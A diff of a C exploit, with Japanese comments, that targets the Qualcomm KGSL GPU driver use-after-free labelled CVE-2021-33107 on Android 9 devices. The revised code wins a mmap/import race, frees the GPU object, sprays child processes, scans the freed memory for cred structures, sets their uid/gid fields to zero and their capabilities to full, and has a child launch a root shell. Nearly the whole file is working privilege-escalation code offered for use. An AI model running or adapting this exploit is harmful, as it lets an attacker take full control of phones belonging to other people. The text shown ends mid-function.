@@ -1,7 +1,10 @@
 /*
  * CVE-2021-33107 (CVE-33107) kgsl UAF exploit
- * 動的アドレス割り当て版（フェーズ1のmmap失敗に対処）
- * Compile: clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
+ * 専用版: A3xx (SD425) + Android 9 対応
+ * - CPU から UAF 領域を直接スキャン/書き換え (GPU コマンド非依存)
+ * - 動的アドレス割り当て (MAP_FIXED 最小化)
+ * Compile: clang -target armv7a-none-linux-androideabi28 -O2 -fPIE -pie -pthread -o exploit exploit.c
+ * (または aarch64 でも可)
  */
 
 #define _GNU_SOURCE
@@ -27,7 +30,7 @@
 #include <poll.h>
 #include <sys/stat.h>
 
-/* ---------- KGSL ioctl definitions ---------- */
+/* ---------- KGSL ioctl definitions (共通) ---------- */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -51,16 +54,6 @@ struct kgsl_gpuobj_free {
 };
 #define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
 
-struct kgsl_gpuobj_info {
-    uint64_t gpuaddr;
-    uint64_t flags;
-    uint64_t size;
-    uint64_t va_len;
-    uint64_t va_addr;
-    unsigned int id;
-};
-#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
-
 struct kgsl_gpuobj_import {
     uint64_t priv;
     uint64_t priv_len;
@@ -74,44 +67,7 @@ struct kgsl_gpuobj_import_useraddr {
     uint64_t virtaddr;
 };
 
-struct kgsl_drawctxt_create {
-    unsigned int flags;
-    unsigned int drawctxt_id;
-};
-#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
-
-struct kgsl_command_object {
-    uint64_t offset;
-    uint64_t gpuaddr;
-    uint64_t size;
-    unsigned int flags;
-    unsigned int id;
-};
-
-struct kgsl_gpu_command {
-    uint64_t flags;
-    uint64_t cmdlist;
-    unsigned int cmdsize;
-    unsigned int numcmds;
-    uint64_t objlist;
-    unsigned int objsize;
-    unsigned int numobjs;
-    uint64_t synclist;
-    unsigned int syncsize;
-    unsigned int numsyncs;
-    unsigned int context_id;
-    unsigned int timestamp;
-};
-#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
-
-struct kgsl_cmdstream_readtimestamp_ctxtid {
-    unsigned int context_id;
-    unsigned int type;
-    unsigned int timestamp;
-};
-#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
-
-/* Flags */
+/* flags */
 #define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
 #define KGSL_CACHEMODE_SHIFT           26
 #define KGSL_CACHEMODE_MASK            (0x0C000000ULL)
@@ -120,69 +76,30 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 #define KGSL_CACHEMODE_WRITETHROUGH    2
 #define KGSL_CACHEMODE_WRITEBACK       3
 #define KGSL_USER_MEM_TYPE_ADDR        2
-#define KGSL_CONTEXT_PREAMBLE          0x00000010
-#define KGSL_CONTEXT_NO_GMEM_ALLOC     0x00000002
-#define KGSL_CMDLIST_IB                0x00000001U
-#define KGSL_TIMESTAMP_RETIRED         0x00000002
 
-/* ---------- 動的に決めるアドレス（Phase1でセット） ---------- */
-static uint64_t uaf_base = 0;
-static uint64_t overlap_addr = 0;
-static uint64_t placeholder_addr = 0;
-static uint64_t bogus_addr = 0;
+/* ---------- エクスプロイトパラメータ ---------- */
+#define UAF_SIZE        (16 * 1024 * 1024 + 16 * 1024)  // 16MB+16KB
+#define OVERLAP_SIZE    0x7000
+#define PLACEHOLDER_SIZE (16 * 1024 * 1024 + 256 * 1024) // 16MB+256KB
+#define BOGUS_SIZE      0xffffffffffefd000ULL
+#define SPRAY_PIDS      3000
+#define SCAN_WORDS      (UAF_SIZE / 4)
 
-#define UAF_SIZE       0x10004000ULL          // 16MB+16KB
-#define OVERLAP_SIZE   0x7000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL        // 16MB+256KB
-#define BOGUS_SIZE     0xffffffffffefd000ULL  // 巨大（エラー用）
-
-#define SPRAY_PIDS     2000
-#define SCAN_DWORDS    560
-
-/* Kernel symbols (pre‑KASLR) */
-#define VMLINUX_TEXT               0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED          0xffffffc012197d08ULL
-#define VMLINUX_SELINUX_STATE      0xffffffc0123a4000ULL
-#define VMLINUX_SELINUX_ENFORCING  0xffffffc01240744cULL
-
-/* task_struct offsets (Linux 4.14) */
+/* task_struct offsets (Linux 4.14 / 4.9) */
+#define COMM_OFF        0x818
 #define CRED_OFF        0x740
 #define REAL_CRED_OFF   0x738
-#define COMM_OFF        0x818
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
-static volatile int dc_civac_works = -1; /* -1=untested, 0=no, 1=yes */
 
-/* ---------- Helper functions ---------- */
+/* ---------- ヘルパー ---------- */
 static void die(const char *msg) {
     perror(msg);
     exit(EXIT_FAILURE);
 }
 
-static void sigill_handler(int sig) {
-    dc_civac_works = 0;
-}
-
-static void try_dc_civac(void *addr) {
-    if (dc_civac_works == 0) return;
-    void *old = signal(SIGILL, sigill_handler);
-    __sync_synchronize();
-    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
-    asm volatile("dsb sy" : : : "memory");
-    __sync_synchronize();
-    signal(SIGILL, old);
-    if (dc_civac_works == -1) dc_civac_works = 1;
-}
-
-static void flush_dc_civac_range(void *start, size_t len) {
-    if (dc_civac_works != 1) return;
-    char *p = (char*)((uintptr_t)start & ~63);
-    char *end = (char*)((uintptr_t)start + len);
-    for (; p < end; p += 64) try_dc_civac(p);
-}
-
-/* ---------- KASLR detection via perf_event_open ---------- */
+/* ---------- KASLR 検出 (失敗しても続行) ---------- */
 static uint64_t detect_kaslr(void) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
@@ -197,17 +114,14 @@ static uint64_t detect_kaslr(void) {
 
     int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
     if (fd < 0) {
-        printf("[-] perf_event_open failed: %d\n", errno);
+        printf("[-] perf_event_open 失敗 (errno=%d) - KASLR はスキップ\n", errno);
         return 0;
     }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
     void *buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) {
-        close(fd);
-        return 0;
-    }
+    if (buf == MAP_FAILED) { close(fd); return 0; }
 
     ioctl(fd, PERF_EVENT_IOC_RESET, 0);
     ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
@@ -222,7 +136,6 @@ static uint64_t detect_kaslr(void) {
 
     uint64_t first_kernel_ip = 0;
     int n_ips = 0;
-
     while (tail < head) {
         uint64_t idx = tail & (data_size - 1);
         struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
@@ -234,52 +147,31 @@ static uint64_t detect_kaslr(void) {
         }
         tail += hdr->size;
     }
-
     munmap(buf, mmap_size);
     close(fd);
-
-    if (n_ips == 0) {
-        printf("[-] No kernel IP samples\n");
-        return 0;
-    }
-
-    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
-    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
-    printf("[+] init_cred = 0x%lX (KASLR offset 0x%lX)\n",
-           (unsigned long)ic_addr, (unsigned long)kaslr);
-    return ic_addr;
+    if (n_ips == 0) return 0;
+    // シンボルは使わないので kaslr オフセットだけ戻す
+    return (first_kernel_ip & ~0x1FFFFFULL);
 }
 
-/* ---------- KGSL wrappers ---------- */
+/* ---------- KGSL ラッパー ---------- */
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
-    struct kgsl_gpuobj_alloc a = {
-        .size = size,
-        .flags = flags,
-    };
+    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
         die("gpuobj_alloc");
     return a.id;
 }
 
-static void *gpuobj_mmap(size_t size, unsigned int id, void *hint, int fixed) {
-    int flags = MAP_SHARED | (fixed ? MAP_FIXED : 0);
-    void *p = mmap(hint, size, PROT_READ | PROT_WRITE, flags, kgsl_fd, (off_t)id << 12);
+static void *gpuobj_mmap(size_t size, unsigned int id, void *hint) {
+    // MAP_FIXED は使わない（カーネルに任せる）
+    void *p = mmap(hint, size, PROT_READ | PROT_WRITE, MAP_SHARED,
+                   kgsl_fd, (off_t)id << 12);
     if (p == MAP_FAILED) {
-        printf("mmap(size=0x%zx, id=%u, hint=%p, fixed=%d) failed: %s\n",
-               size, id, hint, fixed, strerror(errno));
-        return MAP_FAILED;
+        // ヒントがダメならゼロから試す
+        p = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
+                 kgsl_fd, (off_t)id << 12);
     }
     return p;
-}
-
-static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
-    struct kgsl_gpuobj_info inf = { .id = id };
-    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
-    if (ret == 0) {
-        if (gpuaddr) *gpuaddr = inf.gpuaddr;
-        if (flags) *flags = inf.flags;
-    }
-    return ret;
 }
 
 static void gpuobj_free(unsigned int id) {
@@ -288,68 +180,9 @@ static void gpuobj_free(unsigned int id) {
         die("gpuobj_free");
 }
 
-static unsigned int create_context(void) {
-    struct kgsl_drawctxt_create c = {
-        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
-    };
-    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0)
-        die("create_context");
-    return c.drawctxt_id;
-}
-
-static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
-    struct kgsl_cmdstream_readtimestamp_ctxtid r = {
-        .context_id = ctx_id,
-        .type = KGSL_TIMESTAMP_RETIRED
-    };
-    for (int i = 0; i < 100000; i++) {
-        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
-            return -1;
-        if (r.timestamp >= target)
-            return 0;
-        usleep(100);
-    }
-    return -2;
-}
-
-/* ---------- PM4 helpers (Type‑3) ---------- */
-#define CP_NOP              0x10
-#define CP_MEM_WRITE        0x3D
-#define CP_MEM_TO_MEM       0x73   // A5xx+ で利用可（A3xx非対応）
-#define CP_WAIT_MEM_WRITES  0x12
-#define CP_EVENT_WRITE      0x46
-#define CACHE_FLUSH_TS      0x1C
-
-static inline uint32_t cp_type3_packet(uint32_t opcode, uint32_t count) {
-    return (3 << 30) | (((count) - 1) << 16) | ((opcode & 0xFF) << 8);
-}
-
-static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
-    *lo = (uint32_t)addr;
-    *hi = (uint32_t)(addr >> 32);
-}
-
-static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
-                     size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
-    struct kgsl_command_object cmd_obj = {
-        .gpuaddr = ib_gpuaddr,
-        .size = ib_bytes,
-        .flags = KGSL_CMDLIST_IB,
-        .id = ib_id
-    };
-    struct kgsl_gpu_command gc = {
-        .cmdlist = (uint64_t)(uintptr_t)&cmd_obj,
-        .cmdsize = sizeof(cmd_obj),
-        .numcmds = 1,
-        .context_id = ctx_id,
-    };
-    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
-    if (out_ts) *out_ts = gc.timestamp;
-    return ret;
-}
-
-/* ---------- Race thread ---------- */
+/* ---------- レーススレッド ---------- */
 static void *race_thread(void *arg) {
+    uint64_t bogus_addr = *(uint64_t *)arg;
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = bogus_addr };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr,
@@ -362,132 +195,92 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
-/* ---------- Main ---------- */
+/* ---------- main ---------- */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0)
-        die("open /dev/kgsl-3d0");
+    if (kgsl_fd < 0) die("open /dev/kgsl-3d0");
     printf("[+] kgsl fd = %d\n", kgsl_fd);
 
-    /* ---- Phase 0: KASLR ---- */
-    printf("[*] Phase 0: KASLR detection\n");
-    uint64_t init_cred_addr = detect_kaslr();
+    /* ---- Phase 0: KASLR (失敗しても続行) ---- */
+    printf("[*] Phase 0: KASLR detection (skip if fail)\n");
+    detect_kaslr();
 
-    /* ---- Phase 1: 動的アドレス取得 ---- */
-    printf("[*] Phase 1: Allocate UAF & placeholder (dynamic addresses)\n");
-    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP |
-                           ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);
+    /* ---- Phase 1: UAF バッファ確保 (動的アドレス) ---- */
+    printf("[*] Phase 1: Allocate UAF buffer (dynamic)\n");
+    uint64_t flags = KGSL_MEMFLAGS_USE_CPU_MAP |
+                     ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);
 
-    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
-    // まず MAP_FIXED なしで mmap し、カーネルが選んだアドレスを取得
-    void *uaf_tmp = gpuobj_mmap(UAF_SIZE, uaf_id, NULL, 0);
-    if (uaf_tmp == MAP_FAILED) die("initial uaf mmap (non-fixed)");
-    uaf_base = (uint64_t)uaf_tmp;
-    munmap(uaf_tmp, UAF_SIZE); // 一旦解放し、後で固定マップで再マップ
+    int uaf_id = gpuobj_alloc(UAF_SIZE, flags);
+    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, NULL);
+    if (uaf_m == MAP_FAILED) die("uaf mmap");
+    uint64_t uaf_base = (uint64_t)uaf_m;
+    printf("[+] UAF mapped at 0x%lx\n", (unsigned long)uaf_base);
 
-    // 固定アドレスで再マップ（成功すればそのアドレスを使う）
-    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)uaf_base, 1);
-    if (uaf_m == MAP_FAILED) {
-        // 固定がダメなら、非固定で得たアドレスをそのまま使う（再度マップ）
-        printf("[!] MAP_FIXED failed, using non-fixed address 0x%lx\n", (unsigned long)uaf_base);
-        uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)uaf_base, 0);
-        if (uaf_m == MAP_FAILED) die("fallback uaf mmap");
-    } else {
-        printf("[+] UAF mapped at 0x%lx\n", (unsigned long)uaf_base);
-    }
+    // プレースホルダ (物理ページの確保を促進)
+    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, flags);
+    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, NULL);
+    if (ph_m == MAP_FAILED) die("placeholder mmap");
+    printf("[+] Placeholder at 0x%lx\n", (unsigned long)ph_m);
 
-    // 他のアドレスを計算（重複しないように）
-    overlap_addr = uaf_base + 0x1000;          // UAF内のオフセット
-    placeholder_addr = uaf_base + UAF_SIZE + 0x1000000; // 16MB + 16MB 後
-    bogus_addr = uaf_base + 0x5000;            // UAF内の別位置（レース用）
-
-    // プレースホルダーを固定マップ（任意のアドレスで良いが、重複防止のため計算した位置を使う）
-    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, (void *)placeholder_addr, 1);
-    if (ph_m == MAP_FAILED) {
-        // 固定がダメなら非固定で
-        ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, NULL, 0);
-        if (ph_m == MAP_FAILED) die("placeholder mmap");
-        placeholder_addr = (uint64_t)ph_m;
-        printf("[!] Placeholder mapped at 0x%lx (non-fixed)\n", (unsigned long)placeholder_addr);
-    } else {
-        printf("[+] Placeholder mapped at 0x%lx\n", (unsigned long)placeholder_addr);
-    }
-
-    // bogus_addr を匿名マップ（GPUとは無関係）
+    // オーバーラップ / ボーガスアドレス (UAF の直後 or 適当な空き領域)
+    uint64_t overlap_addr = uaf_base + UAF_SIZE + 0x1000;
+    uint64_t bogus_addr = uaf_base + UAF_SIZE + 0x2000;
+    // ボーガス用の匿名マップを確保 (競合防止)
     if (mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
-        // 失敗しても無視（代わりに他の場所を使う）
-        printf("[!] bogus_addr mmap failed, using another\n");
-        bogus_addr = uaf_base + 0x6000;
-        if (mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
-                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
-            die("bogus mmap");
+        bogus_addr = uaf_base + UAF_SIZE + 0x3000; // 再挑戦
+        mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
+             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
     }
 
-    printf("  UAF base=0x%lx, overlap=0x%lx, placeholder=0x%lx, bogus=0x%lx\n",
-           (unsigned long)uaf_base, (unsigned long)overlap_addr,
-           (unsigned long)placeholder_addr, (unsigned long)bogus_addr);
+    printf("  overlap=0x%lx bogus=0x%lx\n", (unsigned long)overlap_addr,
+           (unsigned long)bogus_addr);
 
-    /* ---- Phase 2: Race ---- */
+    /* ---- Phase 2: Race (UAF トリガー) ---- */
     printf("[*] Phase 2: Trigger UAF race\n");
-    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+    int ov_id = gpuobj_alloc(OVERLAP_SIZE, flags);
 
     pthread_t thr;
-    if (pthread_create(&thr, NULL, race_thread, NULL) != 0)
+    if (pthread_create(&thr, NULL, race_thread, &bogus_addr) != 0)
         die("pthread");
 
     int hit = 0;
     for (int i = 0; i < 5000000; i++) {
         void *r = mmap((void *)overlap_addr, OVERLAP_SIZE,
-                       PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
-                       kgsl_fd, (off_t)ov_id << 12);
+                       PROT_READ | PROT_WRITE,
+                       MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
-        if (r != MAP_FAILED) {
-            munmap(r, OVERLAP_SIZE);
-            hit = 1;
-            break;
-        }
-        if (e == ENODEV) {
-            hit = 1;
-            break;
-        }
-        if (i % 500000 == 0)
-            printf("  race %d/%d errno=%d\n", i, 5000000, e);
+        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
+        if (e == ENODEV) { hit = 1; break; }
+        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
     }
-
     race_done = 1;
     pthread_join(thr, NULL);
 
-    if (!hit) {
-        printf("[-] Race failed\n");
-        goto cleanup;
-    }
+    if (!hit) { printf("[-] Race failed\n"); goto cleanup; }
     printf("[+] Race won (errno=ENODEV)\n");
 
-    /* ---- Phase 3: Free UAF (physical pages freed) ---- */
+    /* ---- Phase 3: UAF 解放 (物理ページが空く) ---- */
     printf("[*] Phase 3: Free UAF object\n");
     gpuobj_free(uaf_id);
     printf("[+] UAF freed, physical pages released\n");
 
-    /* ---- Phase 4: Reclaim pages ---- */
-    printf("[*] Phase 4: Reclaim pages (compact/drop caches)\n");
+    /* ---- Phase 4: ページ回収 & スプレー ---- */
+    printf("[*] Phase 4: Reclaim pages & fork spray\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
     rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    /* ---- Phase 5: Fork children ---- */
-    printf("[*] Phase 5: Spawning %d children\n", SPRAY_PIDS);
     int notify_pipe[2];
-    if (pipe(notify_pipe) < 0)
-        die("pipe");
+    if (pipe(notify_pipe) < 0) die("pipe");
     fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
     fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);
 
+    printf("[*] Spawning %d children (task_struct spray)\n", SPRAY_PIDS);
     pid_t spray_pids[SPRAY_PIDS];
     int n_spray = 0;
     for (int i = 0; i < SPRAY_PIDS; i++) {
@@ -495,23 +288,14 @@ int main(int argc, char **argv) {
         if (p == 0) {
             close(notify_pipe[0]);
             prctl(PR_SET_NAME, "TASKUAF!!");
+            // 子プロセスは uid=0 になるのを監視
             for (int j = 0; j < 1800; j++) {
                 usleep(200000);
                 if (getuid() == 0) {
                     usleep(50000);
                     pid_t me = getpid();
                     write(notify_pipe[1], &me, sizeof(me));
-                    char buf[4096];
-                    int fd = open("/proc/self/status", O_RDONLY);
-                    if (fd >= 0) {
-                        int n = read(fd, buf, sizeof(buf)-1);
-                        close(fd);
-                        if (n > 0) {
-                            buf[n] = 0;
-                            write(1, "=== ROOT SHELL ACTIVE ===\n", 26);
-                            write(1, buf, n);
-                        }
-                    }
+                    // シェル起動
                     execl("/system/bin/sh", "sh", NULL);
                     write(1, "sh exec failed\n", 15);
                     _exit(0);
@@ -520,144 +304,71 @@ int main(int argc, char **argv) {
             close(notify_pipe[1]);
             _exit(0);
         }
-        if (p > 0) {
-            spray_pids[n_spray++] = p;
-        } else {
-            break;
-        }
+        if (p > 0) spray_pids[n_spray++] = p;
+        else break;
     }
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    /* ---- Phase 6: GPU context & buffers ---- */
-    printf("[*] Phase 6: Setup GPU context and buffers\n");
-    unsigned int ctx_id = create_context();
-    printf("  context = %u\n", ctx_id);
+    /* ---- Phase 5: CPU で UAF 領域をスキャン (cred 構造体を探す) ---- */
+    printf("[*] Phase 5: CPU scan UAF range for cred structs\n");
+    uint32_t *scan = (uint32_t *)uaf_base;
+    int found = 0;
+    int total_words = UAF_SIZE / 4;
 
-    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
-    void *ib_m = gpuobj_mmap(0x10000, ib_id, NULL, 0);
-    uint64_t ib_ga = 0;
-    gpuobj_info(ib_id, &ib_ga, NULL);
-    printf("  IB id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);
-
-    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
-    void *dst_m = gpuobj_mmap(0x4000, dst_id, NULL, 0);
-    uint64_t dst_ga = 0;
-    gpuobj_info(dst_id, &dst_ga, NULL);
-    printf("  DST id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);
-
-    /* ---- Phase 7: GPU scan (dynamic range) ---- */
-    printf("[*] Phase 7: Scanning UAF range [0x%lx - 0x%lx]\n",
-           (unsigned long)(uaf_base + 0x300000),
-           (unsigned long)(uaf_base + UAF_SIZE - 0x1000));
-
-    uint64_t task_pages[16];
-    uint32_t task_comm_offs[16];
-    int n_task = 0;
-    uint64_t cred_pages[32];
-    int cred_offs[32];
-    int n_cred = 0;
-
-    uint64_t scan_start = uaf_base + 0x300000;
-    uint64_t end_va = uaf_base + UAF_SIZE - 0x1000;
-
-    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
-        if (((va - scan_start) & 0xFFFFF) == 0)
-            printf("."), fflush(stdout);
-
-        uint32_t *cmd = (uint32_t *)ib_m;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x4000);
-        int dw = 0;
-        cmd[dw++] = cp_type3_packet(CP_NOP, 1);
-        for (int i = 0; i < SCAN_DWORDS; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 4, &dl, &dh);
-            split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0;
-            cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type3_packet(CP_NOP, 1);
-        __sync_synchronize();
-
-        unsigned int ts;
-        if (submit_ib(ctx_id, ib_ga, dw * 4, ib_id, &ts) < 0)
-            break;
-        if (wait_timestamp(ctx_id, ts) < 0)
-            break;
-        __sync_synchronize();
-
-        uint32_t *data = (uint32_t *)dst_m;
-        int comm_off = -1;
-        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
-            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
-                comm_off = i * 4;
-                break;
+    for (int i = 0; i < total_words - 32; i += 1) {
+        // cred 構造体の特徴:
+        // offset+4: uid, offset+8: gid, offset+20: euid, offset+24: egid
+        // uid == gid == euid == egid かつ 1000 < uid < 20000
+        uint32_t uid = scan[i + 1];
+        uint32_t gid = scan[i + 2];
+        uint32_t euid = scan[i + 5];
+        uint32_t egid = scan[i + 6];
+        if (uid == gid && uid == euid && uid == egid && uid > 1000 && uid < 20000) {
+            // securebits (offset+9) は 0 または 4
+            if (scan[i + 9] == 0 || scan[i + 9] == 4) {
+                // cap_inheritable (offset+10,11) は 0
+                if (scan[i + 10] == 0 && scan[i + 11] == 0) {
+                    printf("[+] Found cred at offset 0x%lx (uid=%u)\n",
+                           (unsigned long)(i * 4), uid);
+                    // uid/gid/euid/egid を 0 に
+                    scan[i + 1] = 0; // uid
+                    scan[i + 2] = 0; // gid
+                    scan[i + 3] = 0; // suid
+                    scan[i + 4] = 0; // sgid
+                    scan[i + 5] = 0; // euid
+                    scan[i + 6] = 0; // egid
+                    scan[i + 7] = 0; // fsuid
+                    scan[i + 8] = 0; // fsgid
+                    // cap をフルに
+                    scan[i + 12] = 0xFFFFFFFF; scan[i + 13] = 0x0000003F; // permitted
+                    scan[i + 14] = 0xFFFFFFFF; scan[i + 15] = 0x0000003F; // effective
+                    scan[i + 16] = 0xFFFFFFFF; scan[i + 17] = 0x0000003F; // bset
+                    // security ポインタは弄らない (元の値を保持)
+                    found = 1;
+                    break;
+                }
             }
         }
-        if (comm_off >= 0) {
-            printf("\n  [TASK_COMM] va=0x%lx comm_off=0x%x\n", (unsigned long)va, comm_off);
-            task_pages[n_task] = va;
-            task_comm_offs[n_task] = comm_off;
-            n_task++;
-        }
-
-        int cred_off = -1;
-        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
-            int cnt = 0;
-            for (int j = 0; j < 8; j++)
-                if (data[i + j] == 0x000007D0) cnt++;
-            if (cnt >= 4) { cred_off = i * 4; break; }
-        }
-        if (cred_off >= 0 && n_cred < 32) {
-            printf("\n  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off);
-            cred_pages[n_cred] = va;
-            cred_offs[n_cred] = cred_off;
-            n_cred++;
-        }
-    }
-    printf("\n[*] Scan complete: %d task_struct, %d cred structs\n", n_task, n_cred);
-
-    /* ---- Phase 8: Overwrite cred ---- */
-    if (n_cred > 0) {
-        printf("[*] Phase 8: Overwriting %d creds with uid=0\n", n_cred);
-        for (int p = 0; p < n_cred && p < 32; p++) {
-            uint64_t cbase = cred_pages[p] + cred_offs[p];
-            uint32_t *cmd = (uint32_t *)ib_m;
-            memset(ib_m, 0, 0x10000);
-            int dw = 0;
-            uint32_t addr_lo, addr_hi;
-            split64(cbase + 0x04, &addr_lo, &addr_hi);
-            cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 19);
-            cmd[dw++] = addr_lo; cmd[dw++] = addr_hi;
-            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
-            cmd[dw++] = 0x00000004;
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            cmd[dw++] = cp_type3_packet(CP_NOP, 1);
-            __sync_synchronize();
-
-            unsigned int ts;
-            if (submit_ib(ctx_id, ib_ga, dw * 4, ib_id, &ts) == 0)
-                wait_timestamp(ctx_id, ts);
-            __sync_synchronize();
-            printf("  cred[%d] overwritten\n", p);
-        }
     }
 
-    /* ---- Phase 9: Wait for root ---- */
-    printf("[*] Phase 9: Waiting for root notification\n");
-    close(notify_pipe[1]);
+    if (!found) {
+        printf("[-] No cred found in UAF range\n");
+    } else {
+        printf("[+] cred overwritten (uid=0, caps=full)\n");
+        // キャッシュをフラッシュ (CPU 書き込みが物理メモリに到達するように)
+        __sync_synchronize();
+        // 念の為 dc civac (可能なら)
+        asm volatile("dsb sy" : : : "memory");
+    }
+
+    /* ---- Phase 6: 子プロセスの root 通知を待つ ---- */
+    printf("[*] Phase 6: Waiting for root shell...\n");
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
-    if (poll(&pfd, 1, 10000) > 0 &&
+    if (poll(&pfd, 1, 15000) > 0 &&
         read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
-        printf("[+] Root achieved! PID = %d\n", winner);
+        printf("[+] ROOT! PID=%d\n", winner);
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         waitpid(winner, NULL, 0);
